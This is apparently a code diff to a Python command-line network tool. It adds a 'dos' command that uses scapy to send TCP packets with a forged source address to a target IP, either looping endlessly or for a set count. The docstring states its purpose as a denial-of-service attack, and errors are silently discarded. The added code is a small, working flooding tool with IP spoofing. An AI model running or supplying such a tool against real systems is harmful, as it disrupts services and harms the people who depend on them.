@@ -99,5 +99,32 @@ def sniffer(
 		typer.secho("[!] Keyboard Interrupt", fg=typer.colors.RED)
 		exit()
 
+@app.command()
+def dos(
+	target: str = typer.Option(..., '--target', '-t', help="Specify target address (IP)."),
+	source: str = typer.Option(..., '--source', '-s', help="Specify source address (IP)."),
+	sport: int = typer.Option(..., '--sport', '-sp', help="Specify source port."),
+	dport: int = typer.Option(..., '--dport', '-dp', help="Specify destination port."),
+	count: Optional[int] = typer.Option(None, '--count', '-c', help="Specify how many packet should be sent. By default it will broadcast."),
+):
+	"""
+	To do DOS(Deniel of service) attack on system.
+	"""
+	try:
+		if count is None:
+			# Broadcasting TCP packets
+			send(IP(src=source, dst=target)/TCP(sport=sport, dport=dport),loop=1)
+		else:
+			# Sending selected(count) packets
+			send(IP(src=source, dst=target)/TCP(sport=sport, dport=dport),count=count)
+
+	except Exception as error:
+		# print(error)
+		pass
+
+	except KeyboardInterrupt:
+		typer.secho("[!] Keyboard Interrupt", fg=typer.colors.RED)
+		exit()
+
 if __name__ == "__main__":
 	app()
